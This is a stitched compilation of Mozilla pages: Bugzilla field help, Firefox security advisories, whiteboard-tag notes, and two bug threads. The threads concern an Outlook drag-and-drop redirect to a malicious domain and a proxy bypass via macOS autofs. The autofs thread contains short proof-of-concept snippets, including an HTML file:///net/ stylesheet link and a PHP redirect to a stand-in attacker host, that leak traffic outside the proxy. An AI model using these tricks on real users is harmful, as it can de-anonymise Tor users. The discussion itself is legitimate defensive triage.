Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

##### References

* [Bug 1459383](https://bugzilla.mozilla.org/show_bug.cgi?id=1459383)

#### [#CVE-2018-18499: Same-origin policy violation using meta refresh and performance.getEntries to steal cross-origin URLs](#CVE-2018-18499)

Reporter
James Lee (@Windowsrcer) of Kryptos Logic
Impact
high
##### Description

A same-origin policy violation allowing the theft of cross-origin URL entries when using a `<meta> meta http-equiv="refresh"` on a page to cause a redirection to another site using `performance.getEntries()`. This is a same-origin policy violation and could allow for data theft.

#### [#CVE-2018-12379: Out-of-bounds write with malicious MAR file](#CVE-2018-12379)

Reporter
Holger Fuhrmannek
Impact
moderate
##### Description

When the Mozilla Updater opens a MAR format file which contains a very long item filename, an out-of-bounds write can be triggered, leading to a potentially exploitable crash. This requires running the Mozilla Updater manually on the local system with the malicious MAR file in order to occur.

##### References

* [Bug 1473113](https://bugzilla.mozilla.org/show_bug.cgi?id=1473113)

#### [#CVE-2017-16541: Proxy bypass using automount and autofs](#CVE-2017-16541)

Reporter
Filippo Cavallarin
Impact
moderate
##### Description

Browser proxy settings can be bypassed by using the automount feature with autofs to create a mount point on the local file system. Content can be loaded from this mounted file system directly using a `file:` URI, bypassing configured proxy settings.
*Note: this issue only affects OS X in default configurations. On Linux systems, autofs must be installed for the vulnerability to occur and Windows is not affected.*

##### References

* [Bug 1412081](https://bugzilla.mozilla.org/show_bug.cgi?id=1412081)

#### [#CVE-2018-12381: Dragging and dropping Outlook email message results in page navigation](#CVE-2018-12381)

Reporter
Jana Squires
Impact
low
##### Description

Manually dragging and dropping an Outlook email message into the browser will trigger a page navigation when the message's mail columns are incorrectly interpreted as a URL.
*Note: this issue only affects Windows operating systems with Outlook installed. Other operating systems are not affected.*

##### References

* [Bug 1435319](https://bugzilla.mozilla.org/show_bug.cgi?id=1435319)

#### [#CVE-2018-12382: Addressbar spoofing with javascript URI on Firefox for Android](#CVE-2018-12382)

Reporter
Jordi Chancel
Impact
low
##### Description

The displayed addressbar URL can be spoofed on Firefox for Android using a `javascript:` URI in concert with JavaScript to insert text before the loaded domain name, scrolling the loaded domain out of view to the right. This can lead to user confusion.
*This vulnerability only affects Firefox for Android.*

##### References

* [Bug 1479311](https://bugzilla.mozilla.org/show_bug.cgi?id=1479311)

#### [#CVE-2018-12383: Setting a master password post-Firefox 58 does not delete unencrypted previously stored passwords](#CVE-2018-12383)

Reporter
Jurgen Gaeremyn
Impact
low
##### Description

If a user saved passwords before Firefox 58 and then later set a master password, an unencrypted copy of these passwords is still accessible. This is because the older stored password file was not deleted when the data was copied to a new format starting in Firefox 58. The new master password is added only on the new file. This could allow the exposure of stored password data outside of user expectations.

#### [#CVE-2018-12375: Memory safety bugs fixed in Firefox 62](#CVE-2018-12375)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers and community members Christian Holler, Looben Yang, Jesse Ruderman, Sebastian Hengst, Nicolas Grunbaum, and Gary Kwong reported memory safety bugs present in Firefox 61. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

A remote attacker could entice a user to view a specially crafted web
page, possibly resulting in the execution of arbitrary code with the
privileges of the process or a Denial of Service condition. Furthermore,
a remote attacker may be able to perform Man-in-the-Middle attacks,
obtain sensitive information, spoof the address bar, conduct clickjacking
attacks, bypass security restrictions and protection mechanisms, or have
other unspecified impact.

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Firefox users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-60.2.2"

```

All Mozilla Firefox binary users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-bin-60.2.2"

```

##### Description

Mozilla developers and community members Alex Gaynor, Boris Zbarsky, Christoph Diehl, Christian Holler, Jason Kratzer, Jed Davis, Tyson Smith, Bogdan Tara, Karl Tomlinson, Mats Palmgren, Nika Layzell, Ted Campbell, and Andrei Cristian Petcu reported memory safety bugs present in Firefox 61 and Firefox ESR 60.1. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

## Whiteboard considered harmful

It is recommended that you request alternative metadata instead of using whiteboard tagging.

* Updating whiteboards tags through the API is non-trivial
* There is no global auto-suggest for whiteboard tags
* There is no verification of whiteboard tags; typos will not be caught and prevented
* Renaming a whiteboard tag requires writing a script to update every bug with that tag, changing its last modified timestamp and generating bugmail; other solutions involve a simple change by administrators
* Whiteboard tags cannot be disabled; people might continue to provide them after they are no longer relevant thinking they still apply
* If desired it's possible to restrict who can set flags to particular values; it will never be possible to prevent accidental or other changes to the whiteboard from any user with editbugs or the bug's reporter

Consider using a keyword, a flag, or a status flag. You can request this on [Bugzilla](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).

## Contributor mentoring

For more information, see [Mentors](/Mentors "Mentors").

* `[lang=]`: The programming language involved for this bug.
* `[mentor-lang=]`: (human/natural) language other than English the mentor will be able to communicate to the contributor with.

## Automated Testing

* `[test disabled]`: Indicates an automated test has been disabled. Typically used in bugs filed for intermittent test failures, to indicate that the absence of new failures in the bug is due to the test being disabled - as well as remind module owners that the test needs fixing and re-enabling.

## Autonag

`[no-nag]`: Indicates that a bug should not be modified or commented in by our [Autonag](/Release_Management/autonag "Release Management/autonag") scripts.

## Release Engineering

* `[capacity]`: This bug will help increase (or free up) capacity for our automated build & test machines.

## Sheriffing

* `[leave open]`: This has [been deprecated](https://groups.google.com/forum/#!topic/mozilla.dev.platform/Ie9OXcWbTSs) in favour of the 'leave-open' keyword. Used to ensure that the bug updating tool mcMerge does not close the bug when commits referencing it are merged into mozilla-central.
* `[retriggered]`: Used by sheriffs when investigating Fresh Oranges [[1]](https://charts.mozilla.org/FreshOranges/index.html) to find where a failure started from, using backfills and retriggers

## Firefox

* `dupeme`, `dupme`, or `DUPEME`: we're pretty sure this bug report is a duplicate of another bug, but cannot recall which one or cannot find it.
* `[qa-]`: QE (Quality Engineering) verification not required - superseded by the qe-verify flag.
* `[adv-mainNN+]` (where `NN` is some number): a security advisory about this bug for the release `NN` will be (has been) written.
* `[MemShrink]`: [a project](/Performance/MemShrink "Performance/MemShrink") to reduce memory consumption.

## Community reported bugs

* `[nightly-community]`: This bug was reported by a member of the Firefox Nightly community. Used to triage community-reported bugs and measure the impact of our core community on product quality.
* `[mozfr-community]`: This bug was reported by a member of the MozFR French-speaking community. Used to evaluate the impact of the mozfr.org community on product quality.

## Firefox OS

[Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes](/index.php?title=Template:Note:_This_project_is_no_longer_active,_but_we_leave_these_definitions_for_bug_tracker_historian_purposes&action=edit&redlink=1 "Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes (page does not exist)")

* `[POVB]`: Part of vendor build; the fix of this bug is not in the Mozilla codebase, but it's in our interest to track it.
* `[priority]`: Indicates we are asked by a partner to address this issue with priority.
* `[tarako_only]`: Special pref or feature that only lands on branch for Tarako (low memory phone), i.e. 1.3T branch of Gaia and Gecko. To be picked up on future releases.
* `[p=]/[u=]/[c=]/[s=]`: See [Scrum Development](/BMO/Whiteboard#Scrum_Development "BMO/Whiteboard"). Firefox OS uses the u= tag as the milestone instead, see [Firefox OS Performance Triage](/FirefoxOS/Performance/Triage#Scrumbugs_Tags "FirefoxOS/Performance/Triage")
* `[ft:<name of the team>]`, `[systemsfe]`, etc: Bugs identified to be owned by a "functional team" within B2G engineering. Each team owns a specific set of Bugzilla components, and tags are used to denote owned bugs outside of these components.

## Tor

* `[tor ###]` Part of the [Tor uplift project](/Security/Tor_Uplift/Tracking "Security/Tor Uplift/Tracking"). For example, `[tor 16620]` indicates a corresponding ticket at <https://trac.torproject.org/16620>. See also <https://torpat.ch/uplift>

## Web Compatibility

[Our whiteboard keywords](/Compatibility/BugsGuide "Compatibility/BugsGuide") are already described.

## Scrum Development

The following flags are used by tools like [scrumbu.gs](https://scrumbu.gs/help/) for managing sprints using the scrum development framework:

* `[p=]`: A rough estimate from engineer on how long the bug is going to take.
* `[u=]`: The user (in the scrum sense) that this story affects
* `[c=]`: The component (in the scrum sense) that this story affects
* `[s=]`: An explicit sprint slug this bug should belong to.

If you are not managing a product, you probably don't have to set these.

## What does this whiteboard keyword mean?

If you know what one of the following whiteboard keywords means, please describe it and put it into one of the above categories above (or create a new one):

* `[2.0-FL-bug-bash]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1021384>)
* `[games]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1017892>)
* `[reserve-photon-structure]` ([examples](https://bugzilla.mozilla.org/buglist.cgi?list_id=14108939&status_whiteboard_type=substring&status_whiteboard=%5Breserve-photon-structure%5D&order=Bug%20Number&query_format=advanced))
* `[TCP]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=920036>)
  + my guess: Tablet Contribution Program?

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

```
There are two problems here:

1) dropping an email from the Outlook application on Windows gets interpreted as a URL of the outlook mail columns

2) fromsubjectreceivedsizecategories.com is a malicious site taking advantage of this and needs to get blocked.

Getting SafeBrowsing to block the site would mitigate this particular instance, but we're not having much success there. Besides there might be other apps (or a localized Outlook?) that result in different text that gets Firefox to open a different domain that bad people will then domain-squat on in a similar way.
```

[Malicious site with Freifox.jpg](attachment.cgi?id=8947914)
â€” [Details](attachment.cgi?id=8947914&action=edit)

User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_12\_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
Steps to reproduce:
1. Open Outlook 2016 on a Windows device
2. Drag an email from Outlook, and drop it in a Firefox tab
Actual results:
1. Firefox then redirects to <http://www.fromsubjectreceivedsizecategories.com/>
2. That site in turns redirects to various malicious sites - an example is attached
3. The behaviour continues despite disabling the inline auto-complete option. See <http://kb.mozillazine.org/Inline_autocomplete>
Note that the first site is a combination of the column headers in Outlook.
Also note that I'm unable to reproduce this behaviour with Chrome or IE on Windows, or with Chrome, Firefox and Safari on Mac OSX.
Tested with only Firefox version 57.0.4
Expected results:
Firefox should not auto-complete the drag and drop from Outlook.

Can't open your image, there are errors in it (at least on my system -- maybe it's a variant .jpg format?)
The autocomplete option (if it still works -- that's an old article) would only apply to typing in a URL. Drag and drop is a different mechanism. There's no autocomplete, you're dropping the actual content. If the content you drop is a link to a web page we'll open that page. That page can then do whatever a web page can do that you've browsed to on the web or opened by clicking on a link elsewhere. Redirecting is one of those things.
We can report malicious sites to the SafeBrowsing service, so they get blocked. Otherwise I'm not sure what else here is a Firefox security bug.Flags: needinfo?(jana.squires)

Hi Daniel,
Thanks for your feedback.
To clarify: This behaviour is reproduced with any email that's dragged from Outlook, and into a tab in Firefox.
The site that Firefox tries to navigate to is fromsubjectreceivedsizecategories[.]com/. This is based on the default column headings within Outlook.
I've been able to reproduce the behaviour today using Outlook 2016 (Windows) and Firefox 58.01 (Windows).
I drag any email onto a page of a Firefox tab, an invalid page loads using then drag and drop mechanism, then navigation to the malicious site begins in a second tab. Note it doesn't matter which email I use, the navigation to the aforementioned site is the same.
Are you able to test the behaviour as well?
Regards,
- JanaFlags: needinfo?(jana.squires)

Francois: do we have any mechanism to block sites when tracking protection is OFF (the default)? I believe Firefox is correctly interpreting the outlook content, but some scammer has obtained this domain that must be a default embedded in the format.

I reported this site to the safebrowsing people and it's still not blocked. Can we add it to our own list? This site does nothing good.

Someone has gamed Google's system: "No unsafe content found".

Thanks all for investigating this.
Just want a reminder that during my tests I wasn't able to replicate this on Chrome or IE - only on Firefox.
Admittedly I didn't test it with any other browsers. However it does relate to the way Firefox handles drag and drops into tabs. Is there a way to disable that process in the configuration?

There are two problems here:
1) dropping an email from the Outlook application on Windows gets interpreted as a URL of the outlook mail columns. Why are we trying to interpret mail as anything? It's possible Outlook is tagging their drag content incorrectly, but other browsers seem to have made allowances for that if that's the case.
2) fromsubjectreceivedsizecategories.com is a malicious site taking advantage of this and needs to get blocked.
Getting SafeBrowsing to block the site would mitigate this particular instance, but we're not having much success there so we should look into #1. Besides there might be other apps (or a localized Outlook?) that result in different text that gets Firefox to open a different domain that bad people will then domain-squat on in a similar way.Group: firefox-core-security â†’ dom-core-securityUser Story: (updated)Component: Security â†’ Drag and DropFlags: needinfo?(haftandilian)OS: Unspecified â†’ WindowsProduct: Firefox â†’ Core

[HTML file to show dropped items](attachment.cgi?id=8984726)
â€” [Details](attachment.cgi?id=8984726&action=edit)

unfortunately I don't have outlook 2016 right now.
can anyone perform the following operation to tell me what kind of data is dropped?
1. open the attached file in Firefox 60.0.2, or newer, (or maybe on 58.0.1 if there's any different behavior)
(the file listens to the drop event and shows dropped item's data)
2. drag and drop an email from outlook 2016 to "Drag and drop items here." text in the page
3. copy and paste the whole displayed text into a new text file
4. upload the text file here

If the dropped item doesn't contain "text/uri-list" or "text/moz-list" flavor, but "text/plain" flavor, Firefox tries to interpret every line in the text as URI.
while intepreting, it performs fixup (just like when some word is entered in the location bar),
and it can make some possibly-non-URI to URI (which might explain the long domain).
[bug 1435910](/show_bug.cgi?id=1435910 "RESOLVED FIXED - Dragging multiple lines of text to the tab bar creates multiple tabs") changed this behavior a bit in Firefox 60, and now if there's any absolutely-non-URI line, entire text is treated as a single search term, so it won't open any URI interpreted from the text.
So, the behavior could be different between Firefox 58.0.1 and 60.0.2, and might already be \*fixed\* now.
but anyway I'd like to confirm how this happened, in term of the dropped text content, so the result for the [comment #13](/show_bug.cgi?id=1435319#c13 "RESOLVED FIXED - Dragging an email from Outlook into a Firefox tab redirects to malicious site") is welcome.

Did you ever check with Marshall on policy/legal aspects of adding this to the plugin blocklist? I nearly got caught out by this but luckily for me the corporate web content filtering saved me. Others aren't won't have such protections and I'm surprised issue has been hanging around for 4 months despite this being actively exploited. While it might not be the most elegant solution, adding the URL to the plugin blocklist may well mitigate the vulnerability for the vast majority of people.

Thank you for checking!
So, apparently those words are separated with TAB character, which is somehow removed while fixing up.
(so, it's considered to be an URI inside ContentAreaDropListener.prototype.\_addLinksFromItem, and actually fixed up while opening it)
let flags = Ci.nsIURIFixup.FIXUP\_FLAG\_FIX\_SCHEME\_TYPOS |
Ci.nsIURIFixup.FIXUP\_FLAG\_ALLOW\_KEYWORD\_LOOKUP;
let info = Services.uriFixup.getFixupURIInfo("From\tSubject", flags);
console.log(info.fixedURI.spec);
I'll look into the Services.uriFixup implementation.
(IMO, TAB should be treated in the same way as SPACE, which isn't get removed)
then, I misremembered about the current behavior:
<https://searchfox.org/mozilla-central/rev/d544b118e26422877108c42723b26e9bb4539721/dom/base/contentAreaDropListener.js#70-76>

This is essentially a result of the URL specification, not fixup - `new URL("<http://foo\tbar>")` produces a URL object instead of null.
I guess when we prefix `http` ( inside <https://dxr.mozilla.org/mozilla-central/rev/75a32b57132f8cba42779555662a057a0416a313/docshell/base/nsDefaultURIFixup.cpp#366> ) then we could in principle check if there are tab characters in the input and bail out if so. That seems hacky though, also because they could be in the query string or similar (rather than the hostname) where the current behavior is probably correct.
(FWIW, this probably wants moving back to a frontend component, or maybe Core :: Document Navigation if we think we should indeed fix this inside the URI fixup code, which in any case should probably be moved to toolkit at some point...)

I think that we should probably address this in nsDefaultURIFixup, although it's not easy.
Some strings like domain.tld resemble a URL a bit, so it's OK to fix them up, but From\tSubject really doesn't, so we should be a bit more strict in this regard. "Does it look like a URL" is more difficult for computers than humans, but I think we can do better.
Indeed, the URL code strips some whitespace characters, but that flexibility is mostly to improve webcompat and to make things easier for developers. When we get weird stuff from other sources, we should try to avoid surprises.

I'm not really convinced by this approach, but I assume it fixes the issue here.
I actually think that fixing up by ignoring tabs is probably the user-friendly thing to do in general. The combination with dnd to the result that we get here is unfortunate, but fixing only the dnd consumer would feel wrong because it would leave other issues with e.g. copy/paste (or "Paste and Go").

I mean, we do the inverse (but also wrong) thing in e.g. [https://bugzilla.mozilla.org/show\_bug.cgi?id=1460097](/show_bug.cgi?id=1460097 "VERIFIED FIXED - Hidden character in pasted url gets wrongly interpreted") in that we don't remove enough whitespace when humans try to load content. Fixup is \*meant\* to take things that are barely URLs and make them into URLs. That's part of why I'm conflicted (see [comment #24](/show_bug.cgi?id=1435319#c24 "RESOLVED FIXED - Dragging an email from Outlook into a Firefox tab redirects to malicious site") - fwiw, I hadn't seen your comment when I wrote/posted the patch...)

Don't fix up protocols for tab-separated content

-----------------------------------------------------------------
Thanks!
So, this solves the case that there are at least 3 columns (so there are 2 TABs between them) in the mail listing,
which would match default case and most usecases, I think?
if there's no existing testcase that fails with this change (so, no known case that we should handle otherwise), I think this is reasonable fix for this bug.
the another solution would be, do not add prefix/suffix if there's at least one whitespaces in between non-whitespace characters of given text.
the possible case I can think of which there's whitespaces inside the input URL is, when the URL is copied from somewhere else that wrapped the URL with extra whitespaces. so at least suffix should already be there (let me know if there's another case).
this bug's case is troublesome because we add ".com" to non-hostname thing.
we could be more careful/strict when to treat the given text as possible partial hostname.

I guess it's better adding a static function with descriptive name (like, MaybeTabSeparatedValues, or something like that?),
also, it should be better handling leading/trailing TABs as well.
currently leading/trailing SPACEs are removed here, but TABs are kept:
<https://searchfox.org/mozilla-central/rev/d544b118e26422877108c42723b26e9bb4539721/docshell/base/nsDefaultURIFixup.cpp#150-151>
if there are only multiple leading/trailing TABs in the given text (like, "\t\tmozilla.com\t\t\t", it's now treated as non-URL.
So, this should test that there are at least 1 TAB sequence in the middle of non-TAB text.

I don't want anything to happen per se. Instead, it was merely an observation stumbled upon when attempting to add attach an email to a Jira ticket. Instead of dropping it in the ticket, it was dropped in the tab area; which then created a connection to the malicious url.Flags: needinfo?(jana.squires)

For links in web pages, the reason we have to deal with tabs is stuff like this:
<a href="<http://foo.bar.com/foo/>
baz.html">Stuff</a>
Where the indent after the linebreak includes tabs.
It's not clear what should happen if we get a string like that sent to us from an external app...

Valentin, bz is out, could you review this?
Dan, can you add a rating? For me the redirects point to a page that heavily suggests downloading some malware - but doesn't do anything to keep you there / stop you closing the tab. So I don't think this is severe enough to warrant sec-high/sec-crit and therefore sec-approval, but if you disagree I can fill out the form... :-)

Not sure if we want to land this separately, but just in case, separate patch for the tests.
I got a bit frustrated with the xpcshell lack of messaging about deciphering what:
0:01.62 FAIL do\_single\_test\_run - [do\_single\_test\_run : 619] false == true
actually meant, so I added some more messages to the tests to make them easier to read. Even without that though, this is enough of a not-a-bullseye that I think we could probably land them at the same time. It's pretty hard to go from this patch (change how we handle \t in URI fixup) to "you should drag emails or other tab-separated content to places to land on malicious pages".

I used the malware one, and I might have also used the phishing one just in case I guessed wrong about how Google would categorize it.
I'm guessing sec-low for the rating because Firefox ought to be robust in the face of a malicious site since there's any number of ways users can stumble into one. But depending on what site comes up and what users /thought/ they were doing by dragging the mail our behavior might contribute to social engineering attacks.Flags: needinfo?(dveditz)Keywords: [sec-low](/buglist.cgi?keywords=sec-low&resolution=---)

Sounds reasonable to me. We have decent automated test coverage here, and this has been sitting on beta for a while now without (AFAIK) complaints.
[Approval Request Comment] (for both bugs)
If this is not a sec:{high,crit} bug, please state case for ESR consideration: workaround-ish fix for issue with workflows that may be particularly prevalent on ESR
User impact if declined: potential scam site access

| [Description](/show_bug.cgi?id=1412081#c0)â€¢ 7 years ago |
|  | |

Tor Project received a third-party report of a method for content pages to bypass the proxy. STR:
Create a web page with the following:
<head>
<link href='file:///net/12.12.12.12/a.css' rel='stylesheet'>
</head>
Run a "tcpdump port 111" on 12.12.12.12. UDP events are observed that did not pass through the browser proxy.
(A demo is at <https://pearlcrescent.com/tor/am.html>)
I also observed the same thing for <img> tags. This behavior apparently is caused by automount/autofs, which is enabled by default on macOS and installable on Linux.
More information from a colleague:
My quick test on OSX 10.12.x shows that Chrome and Safari (latest versions) are not affected.
It is also interesting that I see the following message in the browser console after the page load completes (i.e., after it gives up on the automounted file):
Security Error: Content at <https://pearlcrescent.com/tor/am.html> may not load or link to file:///net/192.168.1.43/a.css.
Access is blocked (i.e., the CSS does not load, the image does not load), but only after an attempt has been made to open the file (or maybe just traverse its path.

Ouch, I was able to reproduce. There seems to me to be three things going on here:
a) Why are we loading pages that will generate security errors?
b) Is an HTTP page triggering opening a file content process? If so, I think that's a bug, as those will requests will always generate security errors. (I originally thought it was, but now that I see (c) it's possible this is all happening in the sandboxed process)
c) A kernel bug on macOS that sandboxed processes are able to trigger automount, minimal reproducer:
sandbox-exec -p '(version 1) (deny default) (allow process-exec\* (path "/usr/bin/stat")) (allow file-read\* (subpath "/usr") (subpath "/System") (subpath "/private/var/db/dyld"))' /usr/bin/stat /net/12.12.12.12/a.css
I can see that triggering things in the TCP dump.

For the stylesheet case at least, it seems like the security check is done after the stylesheet loader channel is created. That is probably okay for http: URLs (since creating the channel does not cause any network activity to occur in that case). But tracing through the code path underneath Loader::LoadSheet(), network activity occurs in the file:///net/... case inside the nsFileChannel constructor. Specifically, the call to IsSymlink() hits the network, which is not too surprising since it must call stat() or lstat().
I am not familiar with all of this code, but somehow the security check needs to be done earlier.

That analysis sounds correct to me -- a stat is enough to trigger this. ni?Cristoph who I expect knows this code well.Flags: needinfo?(ckerschb)

The "can web pages load file urls?" is done as part of the usual security checks (CheckMayLoad, CheckLoadURI, content policies like mixed-content blocker and CSP), and given the eventual error message these are still happening. We've found a number of things recently that send extra loads that bypass those. In particular I wonder if this is some kind of preload/prefetch/preconnect speculative load from the parser that bypasses content checks on the incorrect theory "it's OK as long as we check before they end up in the document".
There are multiple prefs that turn off various preloads. Might not take too much time to diagnose whether those are involved or not.
Some of those are
network.http.speculative-parallel-limit (set to 0, though it should only be for http)
network.dns.disablePrefetch (again, file: isn't expected to need dns)

Adding a check to CheckMayLoad, CheckLoadURI, and/or possibly CheckLoadURIWithPrincial prior to constructing the nsIChannel by calling NS\_NewChannelWithTriggeringPrincipal in Loader::LoadSheet would likely solve this issue for attempting to load file: URIs as stylesheets, but would not solve it universally, if it exists elsewhere.
Another option is to bypass the stat checking when file uris are autofs uris on MacOS and Linux, so file:///net/\*. This would fix the problem for all instances with a file uri at a possible risk of symlink confusion breaking SOP (see [bug 782581](/show_bug.cgi?id=782581 "RESOLVED FIXED - Subverting Same-Origin Policy for Local Contents by Symbolic Link")). Since that case dealt with other Android processes gaining access to sensitive content such as password and cookie databases, this may be safe to break in this one case.

I think that seems a bit brittle to me. Arthur reproduced the issue with <img> tags as well.

Okay, I tried to verify whether Linux is actually affected by this and, surprisingly, I failed so far. Here is what I did on a Debian testing machine and an Ubuntu 14.04:
1) Installed the autofs package
2) Uncommented the /net -hosts line in /etc/auto.master
3) Restarted the machine
4) Captured traffic with tcpdump/wireshark going to a website with the PoC.
5) No non-Tor traffic showed up.
I did this both in Tor Browser and vanilla Firefox (pointed to a local Tor) with different settings.
Does anybody have different steps that show Linux is affected, too?

That is the case for all of our security checks in fact. We create a channel and once we call open2() or also asyncOpen2() on the channel we perform the required security checks, because nothing should have hit the network until this point. Apparently you found a case where that's different. So your evaluation of the situation is accurate.
Since we already have the loadInfo available on the nsFileChannel we could use that information to figure out who triggered the load. I would imagine that the web never needs access to a local file and that any kind of upload scenarios (one would have to verify) are triggered by the SystemPrincipal. I hope that is the case, which would make sense. If all that is true then we could have a very hacky way of blocking. A very raw strawman patch could look like this:

This looks promising. However, I am not exactly sure that we have all the necessary things ready at this point looking at ESR 52 code. It seems to me [bug 1319111](/show_bug.cgi?id=1319111 "RESOLVED FIXED - Expose result principal URL (\"final channel URL\") on LoadInfo, convert current consumers of LOAD_REPLACE") added all the changes you build upon. And backporting that one + all the dependent bugs seems unrealistic. Am I missing something (and if not what options do we have instead)?

I did the same steps and I saw UDP traffic to the IP from the file:// path, on port 28416 (but not on port 111). However it only happens once, probably because the error is cached, so if I want to try it again I need to change the IP in the path.

I am adding Honza since he fixed [Bug 1319111](/show_bug.cgi?id=1319111 "RESOLVED FIXED - Expose result principal URL (\"final channel URL\") on LoadInfo, convert current consumers of LOAD_REPLACE"). Anyway, we added the triggeringPrincipal to the loadInfo within [Bug 1083422](/show_bug.cgi?id=1083422 "RESOLVED FIXED - Add triggeringPrincipal to nsILoadInfo") [1], which landed for FF35. In other words triggeringPrincipal information on the loadinfo for subrequest loads should definitely be accurate for ESR52. I don't fully understand why the final channel URL is important to fix the problem in this bug. As I understand it, if mFileURI [2] would point to e.g. file:///net then we would hit the network at the time we call ::init on nsFileChannel, right? So I don't think [Bug 1319111](/show_bug.cgi?id=1319111 "RESOLVED FIXED - Expose result principal URL (\"final channel URL\") on LoadInfo, convert current consumers of LOAD_REPLACE") is relevant in any way for fixing this bug.

Thanks. You probably don't. I was just wondering how to get the proper loadInfo in the constructor and how to abort properly before we hit the UDP leak.

You can simply access the member mLoadInfo (which is the current loadinfo of the file channel). To abort the load I assume you can just return any NS\_ERROR\_\*. (Maybe NS\_ERROR\_FILE\_TARGET\_DOES\_NOT\_EXIST). I looked at other code within the ::init() function and it seems simply returning an error is all there is to do (once we exactly know what condition for aborting is).

Returning an error does not work as the compiler is complaining about doing so in a constructor. And just accessing `mLoadInfo` and doing things like you did in comment:10 (i.e. `mLoadInfo->TriggeringPrincipal()->GetIsCodebasePrincipal()`) does not work as `mLoadInfo` is `null` it seems (if I am doing a `if (mLoadInfo)` the code in the if-clause is never executed). So, what did you have in mind (sorry if I am not following)?Flags: needinfo?(ckerschb)

Well, this is what I had in mind actually. The loadInfo should not be null at this point. Can we figure out why it is null? As Mark suggested, first we could check that we get the required arguments within newChannel2(). But Maybe newChannel2 is not even called and the channel is created somehow different. Further down within the ::init() method, mLoadinfo is even accessed at the moment, so I am surprised it's null.
Regarding returning the error within the ::init() method, that should work, because there is already code that does the same. Or are you really trying to do it in the constructor and not the ::init() method?Flags: needinfo?(ckerschb)

I agree but we need ESR 52 code for Tor Browser and there is no such thing in nsFileChannel.cpp.[1] I tried to work with Christoph's code there which gave me the results I mentioned in comment:17 and made me wonder in comment:15.

[Bug 1319111](/show_bug.cgi?id=1319111 "RESOLVED FIXED - Expose result principal URL (\"final channel URL\") on LoadInfo, convert current consumers of LOAD_REPLACE") rearranged things like this:
instead of...
channel = new nsFileChannen(url) {
// the code we want to patch
}
channel->SetLoadInfo()
...it does...
channel = new nsFileChannel(url) : mURL(url) {}
channel->SetLoadInfo(loadinfo)
channel->Init() {
// the code we want to patch
}
you don't need to bother with the new resultPrincipalURI (not on esr52).
Regarding the codebase principal check, you should ask Boris, but I think we only use codebase principal for thing we are about to load from unknown (and potentially unsafe) uris, but we may also use codebase principal for moz-extenstion (privileged, I think).
as I understand, we later block the load in CSP. what exactly is the check doing? could we move whole check or the part of it that detects the load blocking here? to be on the safe side...

Partly, yes. The problems is that we hit the newChannel() call in `nsIOService::NewChannelFromURIWithProxyFlagsInternal()` without loadFlags. I guess what we can do is do just return an error in our case if we hit that part. I've implemented that in a patch and I don't see the proxy bypass on my Linux box anymore. mcs/arthur: could you verify that on OS X as well (see the attached patch; I could not give its final version a test yet as I blew my build away accidentally and need to make a full new one but am about to be afk)?

I built Tor Browser alpha (based on ESR52) without and with the patch (23447a7a1b0), for OS X, and tested it as before. I can confirm that the patch stops the proxy bypass for both the CSS and <image> cases. I have also browsed to several sites with the patched version and didn't run into any problems.
Here are my branches:

Here are my builds in case anyone wants to try it:

And I applied the patch to the latest Firefox ESR52 and pushed to try. We'll see how it goes:

Okay, we were about to release Tor Browser 7.0.9 with the attached workaround today but Filippo and Nicolas found ways to bypass it. So we stopped.
I don't have a URL handy to test for those new attack vectors but they seem to involve redirect mechanisms. Just pointing a victim to a php file containing:
<?php
header("Location: file:///net/evil-attacker.com/a.css");
?>
is supposed to be enough or creating an .htaccess file with the line

The problem seems to be that the codebase principal check is failing in the redirect case. Christoph: Do we have a different check we could use for both redirect/non-redirect cases? Just using the triggering principal one and preventing channel creation in that case already seems to be the nuclear option as it makes file:// unusable.Flags: needinfo?(ckerschb)

I made a patch that blocks redirects from http(s) to file:// URIs. I'm not sure if it's the ideal approach, but I think it might be a reasonable stopgap for Tor Browser:

(Note this doesn't include Georg's other patch. Both patches will be needed to block everything.)

Dan, under what circumstances do we want to allow an http redirect to a file? I can't think of any off the top of my head (and didn't think we ever allowed it.. but apparently that's not true.). We can certainly block it right in the http channel code if there isn't some use case to support..

A simple test showed that we as expected block http->file redirects. For a quick fix we could add the simple schema check as suggested in [comment 36](/show_bug.cgi?id=1412081#c36 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") to prevent creation of the file channel.
I can't think of a general check from the top of my head to do checkmayload checks prior we do stat() on the file.

